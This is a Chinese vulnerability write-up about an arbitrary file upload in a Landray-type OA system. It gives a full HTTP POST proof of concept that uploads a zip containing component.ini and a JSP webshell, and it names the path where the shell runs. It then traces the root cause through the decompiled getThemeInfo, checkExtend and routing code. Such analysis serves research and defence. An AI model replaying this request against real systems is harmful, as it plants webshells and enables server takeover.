某OA漏洞复现分析
=========

0x00 前言
-------

最近看有公众号公布了某凌OA的0day，本着学习的心态看看是怎么个事

0x01 前置知识
---------

该OA目前是基于spring框架开发的，相关spring bean的配置在kmssConfig中。

在spring框架中HandlerMapping 组件是处理**URL请求映射到合适**的处理程序（Handler）上，来实现控制器与页面之间的交互（通俗点就是路由映射）。

Spring MVC 自带3种HandlerMapping , 如下：

1. **SimpleUrlHandlerMapping**: 通过配置请求路径和Controller映射建立关系，找到相应的Controller 。
2. **RequestMappingHandlerMapping**: 通过注解 如@RequestMapping("/userlist") 来查找对应的Controller。
3. **BeanNameUrlHandlerMapping**: 通过定义的 beanName 进行查找要请求的Controller。

而该OA主要是按**BeanNameUrlHandlerMapping**和**RequestMappingHandlerMapping** 来实现路由映射的，在common下的spring-mvc.xml中可以看的其配置

![image-20231207180702118](https://shs3.b.qianxin.com/butian_public/f2542474349af432230c0b6844570af82fa31017a78ac.jpg)

![image-20231207180549103](https://shs3.b.qianxin.com/butian_public/f36450741aa568b057a87260f9f71f346dff3d74b55d7.jpg)

0x02 漏洞复现
---------

首先创建一个压缩文件里面包含`component.ini`和`webshell`

其中`component.ini`配置如下：

```php
id=2023
name=check.txt
```

两者打包成压缩包，通过如下poc上传

```php
POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
Host: IP:PORT
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Referer: http://.com/sys/ui/sys_ui_component/sysUiComponent.do?method=upload
Content-Length: 474
Content-Type: multipart/form-data; boundary=---------------------------15610248407689
Cookie: SESSION=YmI0OGMyZDQtZDE0NC00MTQ2LWJmMzMtNWE5NDMwOTYxM2Ex
DNT: 1
Connection: close

-----------------------------15610248407689
Content-Disposition: form-data; name="file"; filename="test.zip"
Content-Type: application/x-zip-compressed

PKx3;x4;x14;
-----------------------------15610248407689
```

![image-20231207183340445](https://shs3.b.qianxin.com/butian_public/f497377dce0ce2f45336e7e20b4a456196f576468561c.jpg)

访问`/resource/ui-component/2023/test.jsp`，成功解析

![image-20231207183434771](https://shs3.b.qianxin.com/butian_public/f856973fb7fe53ee97f584e8ba60fa8df6a287b3d1a04.jpg)

0x03 漏洞分析
---------

根据poc，漏洞url为：`/sys/ui/sys_ui_component/sysUiComponent.do`，搜索关键字在/sys/ui目录下spring-mvc.xml中找的了其bean创建，这里是通过`BeanNameUrlHandlerMapping`将bean name作为路由

![image-20231207180503076](https://shs3.b.qianxin.com/butian_public/f312045dec1bd69582334b89e2a19b997ab5612bc67a4.jpg)

跟进到SysUiComponentAction类中，其中存在`getThemeInfo`方法，也就是我们poc中`method=getThemeInfo`

```java
public ActionForward getThemeInfo(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception {
        response.setCharacterEncoding("UTF-8");
        JSONObject rtnJson = new JSONObject();

        try {
            SysUiComponentForm mainForm = (SysUiComponentForm)form;
            JSONObject jsonInfo = this.getSysUiComponentService().checkExtend(mainForm.getFile());
            String extendId = jsonInfo.getString("extendId");
            String extendName = jsonInfo.getString("extendName");
            String folderName = jsonInfo.getString("folderName");
            String thumbnail = jsonInfo.getString("thumbnail");
            String folderPath = System.getProperty("java.io.tmpdir");
            if (!folderPath.endsWith("/") && !folderPath.endsWith("\\")) {
                folderPath = folderPath + "/";
            }

            folderPath = folderPath + folderName;
            File appThemeFolder = new File(this.getAppFolder(extendId));
            FileUtils.copyDirectory(new File(folderPath), appThemeFolder);
            if (StringUtil.isNotNull(thumbnail)) {
                if (!thumbnail.startsWith("/")) {
                    thumbnail = "/" + thumbnail;
                }

                rtnJson.put("fdThumbnail", "resource/ui-component/" + extendId + thumbnail);
            }

            rtnJson.put("directoryPath", extendId);
            rtnJson.put("status", "1");
        } catch (Exception var14) {
            rtnJson.put("status", "0");
            this.logger.error("获取上传部件的信息异常", var14);
        }

        response.getWriter().print(rtnJson);
        return null;
    }
```

乍眼一看好像没有解压操作，我们分析一下如下关键方法

```java
SysUiComponentForm mainForm = (SysUiComponentForm)form;
JSONObject jsonInfo = this.getSysUiComponentService().checkExtend(mainForm.getFile());
```

此处是处理传参返回一个json数据

来到`checkExtend`方法

```java
public JSONObject checkExtend(FormFile input) throws Exception {
    return this.checkExtend(input.getFileName(), input.getInputStream());
}
```

该oa对上传对象进行了封装为FormFile，其中filename为上传文件名，getInputStream为文件内容的输入流

![image-20231207185413928](https://shs3.b.qianxin.com/butian_public/f823067925b1e28a86a811ac3a39fc381e600825f8552.jpg)

这里首先是在临时文件夹中解压上传上了的压缩包，如果里面存在`component.ini`文件时会提取其中的`id`和`name`的值，并在json中返回，这里同时会返回临时压缩包名，在`ZipUtil.unZip`中可以看到在解压过程中是压缩包名作为目录文件将解压到其中

![image-20231207190011055](https://shs3.b.qianxin.com/butian_public/f30936190f9014c1b00319341a9a48336fb40cb969a75.jpg)

ps：这里还对防止了文件名目录穿越

然后回到`getThemeInfo`还有另一处调用

```java
folderPath = folderPath + folderName;
File appThemeFolder = new File(this.getAppFolder(extendId));
FileUtils.copyDirectory(new File(folderPath), appThemeFolder);
```

构造参数`folderPath`是系统临时文件目录+folderName，`appThemeFolder`是web目录的resource/ui-component/+extendId(component.ini中id的值)

![image-20231208093300747](https://shs3.b.qianxin.com/butian_public/f3626542d33d18d1ac90c21931f850dec4dab66e550cc.jpg)

随后进入`FileUtils.copyDirectory`方法（看名字应该是目录拷贝）

![image-20231208092933403](https://shs3.b.qianxin.com/butian_public/f954199edf380d1130c182ceb63c4d7098e6d39e4cc28.jpg)

所以`getThemeInfo`方法的处理逻辑是

1、解压压缩包到临时文件夹

2、根据`component.ini`中id的值，将临时压缩文件内的内容拷贝到resource/ui-component+id目录下

3、因为未对文件做校验，最终导致可上传jsp文件

0x04 路由映射
---------

poc中`method=getThemeInfo`是如何映射到`SysUiComponentAction`中的`getThemeInfo`方法呢

我们来看看`SysUiComponentAction`的继承关系图

![image-20231208105123965](https://shs3.b.qianxin.com/butian_public/f8196925e34c6fd67d89ee6ceb4534c0ce8a3b18ac1f2.jpg)

可以看的主要是继承了`KmssMultiActionController`，而`KmssMultiActionController`又继承自spring的`AbstractController`。根据spring执行handle逻辑，处理请求的逻辑在`handleRequestInternal`中实现，来看看`KmssMultiActionController`如何重载该方法的

```java
protected final ModelAndView handleRequestInternal(HttpServletRequest request, HttpServletResponse response) throws Exception {
        String methodName = this.getMethodName(this.createActionMapping(request, response), this.createActionForm(request, response), request, response, this.getParameter());
        if (StringUtil.isNull(methodName)) {
            Method executeMethod = (Method)this.strutsStyleHandleMethods.get("execute");
            return this.invokeMethod(executeMethod, StrutsStyleMethodTypes, request, response);
        } else {
            return this.chooseStyle(methodName, request, response);
        }
    }

```

首先调用`getMethodName`应该是获取根据参数获取method方法，this.getParameter()返回值为`"method"`

这个`getMethodName`真正的实现在`KmssMultiActionController`子类`BaseAction`中

![image-20231208110232104](https://shs3.b.qianxin.com/butian_public/f475186a6a1c02ac1386a9214197dcaf52716254ac87f.jpg)

当请求参数存在parameter（也就是method参数）返回其参数值。

然后是调用strutsStyleHandleMethods数组中的execute方法对象反射调用该方法。

```java
Method executeMethod = (Method)this.strutsStyleHandleMethods.get("execute");
return this.invokeMethod(executeMethod, StrutsStyleMethodTypes, request, response);
```

而`this.strutsStyleHandleMethods`数组的初始化是下面方法中

![image-20231208110823118](https://shs3.b.qianxin.com/butian_public/f8661159837cb63380109a9b439a3e4a5479913cfac6c.jpg)

这里主要获取参数为`Class[]{ActionMapping.class, ActionForm.class, HttpServletRequest.class, HttpServletResponse.class};`的方法。此方法在`KmssMultiActionController`的无参构造方法中，继承的子类实现了无参构造方法所以`strutsStyleHandleMethods`会获取到子类所有符合参数的方法。

调用`this.invokeMethod`反射调用`KmssMultiActionController`的`execute`方法

![image-20231208112011207](https://shs3.b.qianxin.com/butian_public/f3764198d0df2a0d2d84f2f745d9f1436ee3eab245311.jpg)

大概逻辑是获取参数中`method`的值进行反射调用